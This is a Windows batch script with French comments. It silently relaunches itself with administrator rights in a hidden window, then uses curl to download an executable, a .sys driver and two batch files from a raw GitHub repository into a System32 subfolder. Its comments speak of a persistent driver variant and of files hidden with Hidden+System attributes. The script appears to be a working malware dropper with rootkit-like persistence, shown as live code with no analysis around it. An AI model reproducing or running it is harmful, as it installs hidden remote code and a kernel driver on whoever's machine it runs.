@echo off
setlocal EnableExtensions

if /i "%~1"=="hidden" goto :work

powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -Verb RunAs -WindowStyle Hidden"
exit /b 0

:work
set "DEST=C:\Windows\System32\InputMethod\SHARED"
set "BASE=https://raw.githubusercontent.com/tyysetse-cloud/csdfgfsdq/refs/heads/main"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"

if not exist "%DEST%" mkdir "%DEST%" >nul 2>&1

for %%F in (UIGB.exe hidir.sys run.bat fix.bat) do (
    curl.exe -fsSL --retry 3 --connect-timeout 15 -o "%DEST%\%%F" "%BASE%/%%F" >nul 2>&1
)

if not exist "%DEST%\UIGB.exe" exit /b 1
if not exist "%DEST%\hidir.sys" exit /b 1
rem Driver embarque (variante seed persistante) : ecrase celui du depot.
rem Le fichier est deja masque (Hidden+System) : .NET refuse d'ecrire dessus
rem tant que l'attribut est pose, donc on le retire d'abord.
